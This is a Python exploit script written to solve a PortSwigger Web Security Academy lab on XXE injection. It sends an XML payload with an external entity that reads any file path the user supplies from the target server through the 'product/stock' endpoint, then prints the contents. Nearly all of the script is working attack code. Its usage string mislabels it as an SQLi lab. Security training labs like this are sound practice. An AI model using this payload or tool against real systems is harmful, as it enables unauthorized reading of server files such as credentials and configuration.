#!/usr/bin/python3

from time import sleep
import sys
import logging
import argparse
import urllib3
import urllib.parse
import urllib.request

from colorama import Fore, Style
import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PROXIES = {
    "http": "127.0.0.1:8080",
    "https": "127.0.0.1:8080",
}

log = logging.getLogger(__name__)
logging.basicConfig(
    stream=sys.stdout,
    level=logging.INFO,
    format=Fore.BLUE + "[{asctime}] {message}",
    style="{",
    datefmt= Fore.BLUE + "%H:%M:%S",
)

def normalize_url(url):
    if not url.endswith("/"): 
        url = url + "/"
    return url

def is_url_reachable(url):
    try:
        urllib.request.urlopen(url)
        return True
    except:
        return False

def retrieve_content(url, uri, payload, session, no_proxy) :
    if no_proxy:
        r = session.post(url + uri, data=payload)
    else:
        r = session.post(url + uri, data=payload, verify=False, proxies=PROXIES)
    
    content = r.text.replace("Invalid product ID: ", "")
    content = content.replace('"', '')
    if "XML parser exited with error" in content :
        log.info(Style.BRIGHT + Fore.WHITE + "[" + Fore.RED + "-" + Fore.WHITE + "]" + Style.BRIGHT + Fore.RED + " Unable to retrieve the content of the specified file :(" + '\n')
        sys.exit(-1)
    return content


def is_solved(url, session, no_proxy):
    def Get_Response(session, url, no_proxy):
        if no_proxy:
            resp = session.get(url)
        else:
            resp = session.get(url, proxies=PROXIES, verify=False)
        if "Congratulations, you solved the lab!" in resp.text:
            return True
        
    solved = Get_Response(session, url, no_proxy)
    if solved:
        return True
    else:
        sleep(2)
        Get_Response(session, url, no_proxy)

if __name__ == "__main__":
    
    try: 
        parser = argparse.ArgumentParser(description="Usage Example: python3 SQLi-Lab#6.py --url https://0a2100.web-security-academy.net/ --no-proxy")
        parser.add_argument("-u", "--url", help="Enter the Lab URL", required=True)
        parser.add_argument("-f", "--file", help="Enter the path to the file you want to retrieve", required=True)
        parser.add_argument("-n", "--no-proxy", help="Do not use proxy", default=False, action="store_true")
        parser.add_argument("-v", "--verbose", help="Increase the verbosity level", default=False, action="store_true")

        args = parser.parse_args()

        url = normalize_url(args.url)
        uri = "product/stock"
        payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY file SYSTEM "file://""" + args.file + """"> ]>
<stockCheck><productId>&file;</productId><storeId>1</storeId></stockCheck>"""

        session = requests.Session()

        banner = Style.BRIGHT + Fore.BLUE + f"""
{'-'*100}
# Platform          : Web Security Academy Portswigger			
# Web Vulnerability : XXE Injection
# Type              : Server-side
{'-'*100}
{'-'*100}
# Lab #1            : Exploiting XXE using external entities to retrieve files
# Lab Level         : Apprentice
# Link              : https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files
{'-'*100}
        """
        print(banner)
        sleep(1)
        if (args.verbose) :

            log.info(Fore.WHITE + "[" + Fore.BLUE + "*" + Fore.WHITE + "]" + " Target URL: " + url)
            sleep(1)
            log.info(Fore.WHITE + "[" + Fore.BLUE + "*" + Fore.WHITE + "]" + " Testing connection to the target URL")

            if is_url_reachable(url):
                log.info(Fore.WHITE + "[" + Fore.BLUE + "*" + Fore.WHITE + "]" + " Testing for XXE in check stock feature ...")
                sleep(1)
                log.info(Fore.WHITE + "[" + Fore.GREEN + "+" + Fore.WHITE + "]" + " productId data node is vulnerable to XXE injection")
                sleep(1)
                log.info(Fore.WHITE + "[" + Fore.GREEN + "+" + Fore.WHITE + "]" + " Retrieving the content of " + Fore.CYAN + args.file + Fore.WHITE + " file ...")
                sleep(1)
                file = retrieve_content(url, uri, payload, session, args.no_proxy)
                print('\n' + file)

                if is_solved(url, session, args.no_proxy) :
                    log.info(Fore.WHITE + "[" + Fore.GREEN + "+" + Fore.WHITE + "]" + Style.BRIGHT + Fore.CYAN + args.file + Fore.WHITE + " file retrieved successfully :)")
                    print()
                    log.info(Fore.WHITE + "[" + Fore.GREEN + "+" + Fore.WHITE + "]" + Style.BRIGHT + Fore.WHITE + " The Lab should now be solved. Congrats !")
                    print("\n")

            else: 
                log.info(Style.BRIGHT + Fore.WHITE + "[" + Fore.RED + "-" + Fore.WHITE + "]" + Style.BRIGHT + Fore.RED + " Unable to connect to the target URL")
                log.info(Style.BRIGHT + Fore.WHITE + "[" + Fore.RED + "-" + Fore.WHITE + "]" + Style.BRIGHT + Fore.RED + " If the problem persists, please check that the provided target URL is reachable.")
                sys.exit(-1)

        else:
            if is_url_reachable(url):
                log.info(Fore.WHITE + "[" + Fore.BLUE + "*" + Fore.WHITE + "]" + " Retrieving the content of " + args.file + " file ...")
                sleep(1)
                file = retrieve_content(url, uri, payload, session, args.no_proxy)
                print('\n' + file)

            else:
                log.info(Style.BRIGHT + Fore.WHITE + "[" + Fore.RED + "-" + Fore.WHITE + "]" + Style.BRIGHT + Fore.RED + " Unable to connect to the target URL")
                log.info(Style.BRIGHT + Fore.WHITE + "[" + Fore.RED + "-" + Fore.WHITE + "]" + Style.BRIGHT + Fore.RED + " If the problem persists, please check that the provided target URL is reachable.")
                sys.exit(-1)

    except KeyboardInterrupt:
        print("\n")
        log.info(Fore.RED + "[-] The exploit has been INTERRUPTED !")

    except Exception as e:
        log.info(Fore.RED + "[-] " + str(e))
